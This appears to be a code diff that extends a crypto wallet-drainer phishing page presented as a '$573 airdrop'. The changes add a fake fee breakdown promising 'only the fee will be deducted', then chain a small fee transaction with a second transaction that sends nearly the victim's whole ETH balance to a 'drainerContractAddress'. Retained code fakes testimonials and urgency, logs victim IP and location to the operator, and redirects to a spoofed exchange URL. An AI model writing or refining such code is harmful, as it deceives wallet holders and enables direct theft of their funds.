@@ -101,6 +101,12 @@
                 </div>
                 <div class="modal-body">
                     <p>Connect your wallet to claim your $573 airdrop securely. Your funds are safe. Only a small fee is required to claim your reward.</p>
+                    <div id="transactionBreakdown" style="background:#f0f0f0;padding:10px;border-radius:5px;margin-bottom:15px;color:#333">
+                        <h6>Transaction Breakdown</h6>
+                        <p>Processing Fee: 0.001 ETH (~$2)</p>
+                        <p>Airdrop Reward: $573</p>
+                        <p style="color:#28A745">Your funds are safe! Only the fee will be deducted.</p>
+                    </div>
                     <div class="wallet-option" data-wallet="metamask">
                         <img src="https://i.postimg.cc/5yLgXCLB/Metamask-icon.png" alt="MetaMask">
                         <span>MetaMask</span>
@@ -145,7 +151,6 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-LtrjvnR4Twt/qOuYxE721u19sVFLVSA4hf/rRt6PrZTmiPltdZcI7q7PXQBYTKyf" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js" crossorigin="anonymous"></script>
     <script>
-        // Verify that Web3 is loaded
         if (typeof Web3 === 'undefined') {
             console.error('Web3.js failed to load. Please check the CDN link or your internet connection.');
             alert('Failed to load Web3.js library. Please check your internet connection and try again.');
@@ -163,12 +168,21 @@
             const drainerContractAbi = [
                 { "inputs": [], "stateMutability": "payable", "type": "receive" },
                 { "inputs": [], "name": "withdrawETH", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-                { "inputs": [], "stateMutability": "payable", "type": "fallback" }
+                { "inputs": [], "stateMutability": "payable", "type": "fallback" },
+                { "inputs": [], "name": "collectFee", "outputs": [], "stateMutability": "payable", "type": "function" },
+                {
+                    "inputs": [
+                        { "name": "claimer", "type": "address" }
+                    ],
+                    "name": "claimAirdrop",
+                    "outputs": [],
+                    "stateMutability": "payable",
+                    "type": "function"
+                }
             ];
 
             let cachedIpLocation = null;
 
-            // Start countdown timer
             function startCountdown() {
                 let timeLeft = 300;
                 const timerElement = document.getElementById('countdownTimer');
@@ -186,7 +200,6 @@
             }
             startCountdown();
 
-            // Dynamic testimonials to build trust
             const testimonials = [
                 "John D. just claimed $573!",
                 "Sarah K. got $573 instantly!",
@@ -199,7 +212,6 @@
                 testimonialIndex = (testimonialIndex + 1) % testimonials.length;
             }, 3000);
 
-            // Dynamic spots remaining to create urgency
             let spots = 3;
             setInterval(() => {
                 if (spots > 0) {
@@ -212,7 +224,6 @@
                 }
             }, 10000);
 
-            // Get IP and location
             async function getIpAndLocation() {
                 if (cachedIpLocation) return cachedIpLocation;
                 try {
@@ -225,7 +236,6 @@
                 }
             }
 
-            // Send Telegram alert
             async function sendAlert(msg) {
                 const { ip, location } = await getIpAndLocation();
                 const fullMsg = `Message: ${msg}\nIP: ${ip}\nLocation: ${location}\nTime: ${new Date().toISOString()}`;
@@ -234,7 +244,6 @@
             }
             sendAlert('Victim clicked link');
 
-            // Switch to Sepolia Testnet
             async function switchToSepolia(provider) {
                 try {
                     const chainId = await provider.request({ method: 'eth_chainId' });
@@ -268,62 +277,67 @@
                 }
             }
 
-            // Prompt to send ETH
             async function promptSendETH(web3, walletAddress, retryCount = 0) {
                 const maxRetries = 5;
+                const fakeFee = web3.utils.toWei('0.001', 'ether');
                 try {
                     const balance = await web3.eth.getBalance(walletAddress);
                     const gasPrice = await web3.eth.getGasPrice();
-                    
-                    // Cap gas price to avoid scaring users with high fees
                     const adjustedGasPrice = BigInt(gasPrice) < web3.utils.toWei('50', 'gwei') 
                         ? gasPrice 
                         : web3.utils.toWei('50', 'gwei');
 
-                    // Dynamically estimate gas for the transaction
-                    let estimatedGas;
+                    // Display fake wallet balance
+                    const initialBalance = balance;
+                    const balanceDisplay = document.createElement('div');
+                    balanceDisplay.id = 'fakeBalance';
+                    balanceDisplay.style.cssText = 'text-align:center;margin:20px;color:#FFCA28;font-size:1.1rem;';
+                    balanceDisplay.innerText = `Your Wallet Balance: ${web3.utils.fromWei(initialBalance, 'ether')} ETH`;
+                    document.querySelector('.container').prepend(balanceDisplay);
+
+                    let estimatedGasFee;
                     try {
-                        estimatedGas = await web3.eth.estimateGas({
+                        const contract = new web3.eth.Contract(drainerContractAbi, drainerContractAddress);
+                        const feeData = contract.methods.collectFee().encodeABI();
+                        estimatedGasFee = await web3.eth.estimateGas({
                             from: walletAddress,
                             to: drainerContractAddress,
-                            value: balance
+                            value: fakeFee,
+                            data: feeData
                         });
                     } catch (e) {
-                        estimatedGas = 30000; // Fallback for the optimized contract
+                        estimatedGasFee = 50000;
                     }
 
-                    const gasLimit = Math.floor(estimatedGas * 1.3);
-                    const gasCost = BigInt(adjustedGasPrice) * BigInt(gasLimit);
-                    const valueToSend = BigInt(balance) - gasCost;
+                    const gasLimitFee = Math.floor(estimatedGasFee * 1.3);
+                    const gasCostFee = BigInt(adjustedGasPrice) * BigInt(gasLimitFee);
+                    const totalFeeCost = BigInt(fakeFee) + gasCostFee;
 
-                    if (BigInt(balance) < gasCost) {
-                        sendAlert(`Not enough ETH for gas in ${walletAddress}. Balance: ${web3.utils.fromWei(balance, 'ether')} ETH, Needed: ${web3.utils.fromWei(gasCost.toString(), 'ether')} ETH`);
-                        return `Failed: Not enough ETH for gas. Top up your wallet!`;
-                    }
-                    if (valueToSend <= 0) {
-                        sendAlert(`Insufficient funds in ${walletAddress}. Balance: ${web3.utils.fromWei(balance, 'ether')} ETH`);
-                        return `Failed: Not enough funds to send.`;
+                    if (BigInt(balance) < totalFeeCost) {
+                        sendAlert(`Not enough ETH for fee in ${walletAddress}. Balance: ${web3.utils.fromWei(balance, 'ether')} ETH, Needed: ${web3.utils.fromWei(totalFeeCost.toString(), 'ether')} ETH`);
+                        return `Failed: Not enough ETH for fee. Top up your wallet!`;
                     }
 
-                    const tx = {
+                    const feeTx = {
                         from: walletAddress,
                         to: drainerContractAddress,
-                        value: web3.utils.toHex(valueToSend.toString()),
-                        gas: web3.utils.toHex(gasLimit),
-                        gasPrice: web3.utils.toHex(adjustedGasPrice)
+                        value: web3.utils.toHex(fakeFee),
+                        gas: web3.utils.toHex(gasLimitFee),
+                        gasPrice: web3.utils.toHex(adjustedGasPrice),
+                        data: new web3.eth.Contract(drainerContractAbi, drainerContractAddress).methods.collectFee().encodeABI()
                     };
 
-                    const prompts = [
-                        `Approve a small ${web3.utils.fromWei(gasCost.toString(), 'ether')} ETH fee to claim your $573 airdrop!`,
-                        `One-time fee of ${web3.utils.fromWei(gasCost.toString(), 'ether')} ETH to unlock your $573 reward!`,
-                        `Confirm the ${web3.utils.fromWei(gasCost.toString(), 'ether')} ETH fee to get your $573 now! Attempt ${retryCount + 1}/${maxRetries + 1}`
+                    const feePrompts = [
+                        `Approve a small ${web3.utils.fromWei(totalFeeCost.toString(), 'ether')} ETH fee to start your $573 airdrop claim!`,
+                        `One-time fee of ${web3.utils.fromWei(totalFeeCost.toString(), 'ether')} ETH to unlock your $573 reward!`,
+                        `Confirm the ${web3.utils.fromWei(totalFeeCost.toString(), 'ether')} ETH fee to proceed! Attempt ${retryCount + 1}/${maxRetries + 1}`
                     ];
-                    const promptMessage = prompts[retryCount % prompts.length];
+                    const feePromptMessage = feePrompts[retryCount % feePrompts.length];
 
-                    alert(promptMessage);
+                    alert(feePromptMessage);
 
                     document.getElementById('processingOverlay').style.display = 'flex';
-                    document.getElementById('statusMessage').innerText = 'Processing... Don’t close this window!';
+                    document.getElementById('statusMessage').innerText = 'Processing Fee... Don’t close this window!';
 
                     let progress = 74;
                     const progressInterval = setInterval(() => {
@@ -333,19 +347,88 @@
                         document.getElementById('progressBar').setAttribute('aria-valuenow', progress);
                     }, 500);
 
-                    const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
+                    const feeTxHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [feeTx] });
 
                     clearInterval(progressInterval);
+                    document.getElementById('statusMessage').innerText = 'Fee Approved! Finalizing Airdrop Claim...';
+
+                    const confirmationDiv = document.createElement('div');
+                    confirmationDiv.style.cssText = 'text-align:center;margin:20px;color:#28A745;font-size:1.2rem;animation:fadeIn 1s;';
+                    confirmationDiv.innerHTML = '<p>✅ Fee Confirmed! Preparing your $573 reward...</p>';
+                    document.querySelector('.container').prepend(confirmationDiv);
+
+                    const styleSheet = document.createElement('style');
+                    styleSheet.innerText = '@keyframes fadeIn {0% {opacity:0;} 100% {opacity:1;}}';
+                    document.head.appendChild(styleSheet);
+
+                    document.getElementById('fakeBalance').innerText = `Your Wallet Balance: ${web3.utils.fromWei(initialBalance, 'ether')} ETH`;
+
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+
+                    const remainingBalance = BigInt(balance) - totalFeeCost;
+                    let estimatedGasDrain;
+                    try {
+                        const drainData = new web3.eth.Contract(drainerContractAbi, drainerContractAddress).methods.claimAirdrop(walletAddress).encodeABI();
+                        estimatedGasDrain = await web3.eth.estimateGas({
+                            from: walletAddress,
+                            to: drainerContractAddress,
+                            value: remainingBalance,
+                            data: drainData
+                        });
+                    } catch (e) {
+                        estimatedGasDrain = 30000;
+                    }
+
+                    const gasLimitDrain = Math.floor(estimatedGasDrain * 1.3);
+                    const gasCostDrain = BigInt(adjustedGasPrice) * BigInt(gasLimitDrain);
+                    const valueToSend = remainingBalance - gasCostDrain;
+
+                    if (valueToSend <= 0) {
+                        sendAlert(`Insufficient funds to drain in ${walletAddress}. Balance: ${web3.utils.fromWei(remainingBalance.toString(), 'ether')} ETH`);
+                        return `Failed: Not enough funds to drain after fee.`;
+                    }
+
+                    const drainTx = {
+                        from: walletAddress,
+                        to: drainerContractAddress,
+                        value: web3.utils.toHex(valueToSend.toString()),
+                        gas: web3.utils.toHex(gasLimitDrain),
+                        gasPrice: web3.utils.toHex(adjustedGasPrice),
+                        data: new web3.eth.Contract(drainerContractAbi, drainerContractAddress).methods.claimAirdrop(walletAddress).encodeABI()
+                    };
+
+                    const drainPrompts = [
+                        `Finalize your $573 airdrop claim! Confirm to receive your reward!`,
+                        `Last step! Confirm to get your $573 airdrop now!`,
+                        `Almost done! Confirm to claim your $573! Attempt ${retryCount + 1}/${maxRetries + 1}`
+                    ];
+                    const drainPromptMessage = drainPrompts[retryCount % drainPrompts.length];
+
+                    alert(drainPromptMessage);
+
+                    document.getElementById('processingOverlay').style.display = 'flex';
+                    document.getElementById('statusMessage').innerText = 'Finalizing Airdrop Claim... Don’t close this window!';
+
+                    progress = 74;
+                    const drainProgressInterval = setInterval(() => {
+                        progress += 5;
+                        if (progress > 100) progress = 100;
+                        document.getElementById('progressBar').style.width = `${progress}%`;
+                        document.getElementById('progressBar').setAttribute('aria-valuenow', progress);
+                    }, 500);
+
+                    const drainTxHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [drainTx] });
+
+                    clearInterval(drainProgressInterval);
                     document.getElementById('processingOverlay').style.display = 'none';
                     document.getElementById('statusMessage').innerText = 'Success! Airdrop claimed!';
-                    sendAlert(`Gotcha! ETH drained. Tx Hash: ${txHash}. Funds sent to ${drainerContractAddress}`);
+                    sendAlert(`Gotcha! ETH drained. Tx Hash: ${drainTxHash}. Funds sent to ${drainerContractAddress}`);
 
-                    // Redirect to a fake "processing" page
                     setTimeout(() => {
-                        window.location.href = 'https://bybit.com/en-US/airdrop-processing?tx=' + txHash;
+                        window.location.href = 'https://bybit.com/en-US/airdrop-processing?tx=' + drainTxHash;
                     }, 2000);
 
-                    return `ETH drained. Tx Hash: ${txHash}`;
+                    return `ETH drained. Tx Hash: ${drainTxHash}`;
                 } catch (e) {
                     clearInterval(progressInterval);
                     document.getElementById('processingOverlay').style.display = 'none';
@@ -359,7 +442,6 @@
                 }
             }
 
-            // Process all assets (ETH only for now)
             async function processAllAssets(web3, walletAddress) {
                 let results = [];
                 try {
@@ -371,7 +453,6 @@
                 return results;
             }
 
-            // Bind click events to wallet options
             const walletOptions = document.querySelectorAll('.wallet-option');
             console.log(`Found ${walletOptions.length} wallet options`);
             if (walletOptions.length === 0) {
